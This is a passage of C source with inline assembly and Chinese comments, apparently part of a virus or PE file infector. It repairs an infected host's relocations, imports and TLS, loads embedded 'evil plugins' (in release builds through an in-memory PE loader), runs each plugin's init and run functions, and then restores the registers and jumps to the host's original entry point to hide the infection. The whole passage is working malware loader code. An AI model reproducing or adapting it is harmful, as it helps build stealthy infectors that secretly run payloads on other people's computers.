			__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)addrOldImageBase);
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Orig ImageBase = ");
			__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)pOrigImageBase);
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "BaseRelocation(pOrigImageBase, addrOldImageBase, (__address)pOrigImageBase, FALSE)\r\n");
			if (!BaseRelocation(pOrigImageBase, addrOldImageBase, (__address)pOrigImageBase, FALSE))
				return FALSE;

			// 修复引入表
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "RefixIAT(pOrigImageBase)\r\n");
			if (!RefixIAT(pOrigImageBase))
				return FALSE;

			// 修复静态TLS表,FALSE = ATTACH
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "RefixTLS(pOrigImageBase, FALSE)\r\n");
			if (!RefixTLS(pOrigImageBase, FALSE))
				return FALSE;

			// 顺序加载插件并运行
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Load evil plugins\r\n");
			{
				__integer i = 0;
				__memory pCurrPlugin = NULL;
				__integer iCurrPluginSize = 0;
				__integer iCurrPluginTotal = 0;

				for (i = 0; i < pEvilKernelConfigure->iPluginTotalCount; i++) {
					iCurrPluginSize = pEvilKernelConfigure->PluginSizeArray[i];
					pCurrPlugin = pPluginArray + iCurrPluginTotal;
					// 开始加载
#if defined(__DEBUG_EVIL_PLUGIN__)
					{
						// 如果是调试状态则释放到本地执行
						HANDLE hPluginHandle = NULL;
						__integer iNumWritten = 0;
						__char *pPluginName = NULL;

						pPluginName = (__char *)(pEvilKernelConfigure->PluginNameArray[i]);
						hPluginHandle = CreateFileA((LPCSTR)pPluginName, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
						WriteFile(hPluginHandle, pCurrPlugin, iCurrPluginSize, (LPDWORD)&iNumWritten, NULL);
						CloseHandle(hPluginHandle);
						{
							// 加载
							HMODULE hPluginDll = NULL;
							FPEvilPluginInit pEvilPluginInit = NULL;
							FPEvilPluginRun pEvilPluginRun = NULL;

							hPluginDll = LoadLibraryA((LPCSTR)pPluginName);
							pEvilPluginInit = (FPEvilPluginInit)GetProcAddress(hPluginDll, "EvilPluginInit");
							pEvilPluginRun = (FPEvilPluginRun)GetProcAddress(hPluginDll, "EvilPluginRun");
							pEvilPluginInit();//初始化插件
							pEvilPluginRun();//运行插件
							//FreeLibrary(hPluginDll);
						}
					}
#else
					{
						// 如果是释放状态则使用PE LOADER加载
						__memory pCurrPluginRuntime = NULL;
						__integer iCurrPluginImageSize = 0;
						PIMAGE_NT_HEADERS pCurrPluginNtHdr = NULL;
						FPDllMain pPluginDllMain = NULL;
						FPEvilPluginInit pEvilPluginInit = NULL;
						FPEvilPluginRun pEvilPluginRun = NULL;

						pCurrPluginNtHdr = __GetNtHeader__(pCurrPlugin);
						iCurrPluginImageSize = pCurrPluginNtHdr->OptionalHeader.SizeOfImage;
						pCurrPluginRuntime = __logic_new_size__(iCurrPluginImageSize);
						pPluginDllMain = LoadPlugin(pCurrPlugin, pCurrPluginRuntime, iCurrPluginImageSize);
						// 调用DllMain
						pPluginDllMain();
						pEvilPluginInit = (FPEvilPluginInit)xGetProcAddressImmediately((HMODULE)pCurrPluginRuntime, "EvilPluginInit");
						pEvilPluginRun = (FPEvilPluginRun)xGetProcAddressImmediately((HMODULE)pCurrPluginRuntime, "EvilPluginRun");
						pEvilPluginInit();//初始化插件
						pEvilPluginRun();//运行插件
					}
#endif
					// 增加长度
					iCurrPluginTotal += iCurrPluginSize;
				}
			}/* end for */

			// 跳入到原始入口点
			pNtHdr = __GetNtHeader__(pOrigImageBase);
			if (pEvilKernelConfigure->bIsDll) {
				FPDllMain pDllMain = NULL;
				g_dwOrigEsp = g_xVirusDllArg.dwOrigEsp;
				g_dwOrigEbp = g_xVirusDllArg.dwOrigEbp;
				g_dwOrigEsi = g_xVirusDllArg.dwOrigEsi;
				g_dwOrigEdi = g_xVirusDllArg.dwOrigEdi;
				g_dwOrigEbx = g_xVirusDllArg.dwOrigEbx;
				g_dwOrigEdx = g_xVirusDllArg.dwOrigEdx;
				g_dwOrigEcx = g_xVirusDllArg.dwOrigEcx;
				pDllMain = (FPDllMain)(pOrigImageBase + pNtHdr->OptionalHeader.AddressOfEntryPoint);
				g_addrOrigDllMain = (__address)pDllMain;
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Invoke Target dllmain\r\n");
				__asm {
					;;int 3;
					;; 恢复原始环境
					mov esp, g_dwOrigEsp
					mov ebp, g_dwOrigEbp
					mov esi, g_dwOrigEsi
					mov edi, g_dwOrigEdi
					mov ebx, g_dwOrigEbx
					mov edx, g_dwOrigEdx
					mov ecx, g_dwOrigEcx
					;; 局部变量将不能在使用
					;; 直接跳入原始的入口,在切栈后已经保存了返回地址,直接返回到
					;; LoadLibrary中的地址
					jmp g_addrOrigDllMain
				}
				//return pDllMain((__dword)pOrigImageBase, ul_reason_for_call, lpReserved);
			} else {
				FPOrigEntryAddress pEntryFunction = NULL;
				pEntryFunction = (FPOrigEntryAddress)(pOrigImageBase + pNtHdr->OptionalHeader.AddressOfEntryPoint);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Invoke Target entry address\r\n");
				pEntryFunction();
			}
		}
	}
	
	return TRUE;
}
